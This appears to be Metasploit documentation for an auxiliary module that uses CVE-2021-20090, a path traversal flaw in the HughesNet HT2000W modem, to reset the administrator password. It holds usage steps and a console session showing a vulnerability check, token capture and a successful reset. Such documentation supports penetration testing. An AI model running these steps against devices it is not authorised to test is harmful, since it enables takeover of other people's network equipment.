## Vulnerable Application

This module takes advantage of CVE-2021-20090, a path traversal vulnerability in the HTTP daemon of the HT2000W modem to reset
the administrator password of the configuration portal. It also takes advantage of other vulnerabilities in the device such as
improper use of httokens for authentication and the portal allowing the MD5 hash of the password to be leaked.

## Verification Steps

1. Connect the HT2000W modem to your local area network.
2. Start msfconsole
3. Do: `use auxiliary/admin/http/hughes_ht2000w_pass_reset`
4. Do: `set PASSWORD <new_password>`
5. If necessary, do: `set RHOST <ip_address>`
6. Do: `exploit`
7. Verify that the password for the configuration portal has been changed. 

## Options

### PASSWORD

The new administrator password

### RHOST

The IP address of the web portal. The default address is `192.168.42.1`

## Scenarios

### HughesNet HT2000W Satellite Modem running Arcadyan httpd 1.0

```
msf6 > use auxiliary/admin/http/hughes_ht2000w_pass_reset
msf6 auxiliary(admin/http/hughes_ht2000w_pass_reset) > show options

Module options (auxiliary/admin/http/hughes_ht2000w_pass_reset):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       The new administrator password
   RHOST     192.168.42.1     yes       The IP address of the web portal


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/http/hughes_ht2000w_pass_reset) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(admin/http/hughes_ht2000w_pass_reset) > check

[+] Checking service version...
[+] Attempting path traversal...
[+] 192.168.42.1 - The target is vulnerable.
msf6 auxiliary(admin/http/hughes_ht2000w_pass_reset) > exploit

[+] Obtained httoken: 1809930776
[+] Password reset to: password
[+] Verified password hash: 5f4dcc3b5aa765d61d8327deb882cf99
[+] Password successfully changed!
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/hughes_ht2000w_pass_reset) >
```
